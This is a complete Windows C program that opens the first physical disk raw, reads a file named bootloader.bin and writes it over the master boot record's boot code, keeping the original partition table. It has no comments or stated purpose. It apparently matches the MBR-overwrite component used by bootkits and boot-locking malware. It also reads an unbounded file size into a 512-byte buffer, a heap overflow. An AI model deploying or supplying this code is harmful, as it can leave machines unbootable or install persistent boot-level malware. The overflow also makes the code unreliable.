#include <stdio.h>
#include <Windows.h>

#define SECTOR_SIZE 512

int main() {
	HANDLE hMbr = INVALID_HANDLE_VALUE;
	HANDLE hBootloader = INVALID_HANDLE_VALUE;
	PWCHAR fileName = L"bootloader.bin";
	PWCHAR MBRpath = L"\\\\.\\PhysicalDrive0";

	hMbr = CreateFileW(MBRpath, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (hMbr == INVALID_HANDLE_VALUE) {
		printf("Failed to get MBR handle. %d\n", GetLastError());
		return 1;
	}

	hBootloader = CreateFileW(fileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (hBootloader == INVALID_HANDLE_VALUE) {
		printf("Failed to get file handle. %d\n", GetLastError());
		return 1;
	}

	DWORD fileSize = GetFileSize(hBootloader, NULL);

	PCHAR MBR = (PCHAR)calloc(SECTOR_SIZE, sizeof(CHAR));
	PCHAR newMBR = (PCHAR)calloc(SECTOR_SIZE, sizeof(CHAR));

	if (MBR && newMBR) {
		DWORD dwByteRead = 0;
		DWORD dwByteWrite = 0;
		if (!ReadFile(hMbr, MBR, SECTOR_SIZE, &dwByteRead, NULL)) {
			printf("Failed to read mbr. %d\n", GetLastError());
			return 1;
		}
		if (!ReadFile(hBootloader, newMBR, fileSize, &dwByteRead, NULL)) {
			printf("Failed to read mbr. %d\n", GetLastError());
			return 1;
		}

		memcpy(newMBR + 440, MBR + 440, SECTOR_SIZE - 440);

		SetFilePointer(hMbr, 0, NULL, FILE_BEGIN);
		if (!WriteFile(hMbr, newMBR, SECTOR_SIZE, &dwByteWrite, NULL)) {
			printf("Failed to write to mbr. %d\n", GetLastError());
			return 1;
		}
	}

	system("pause");
}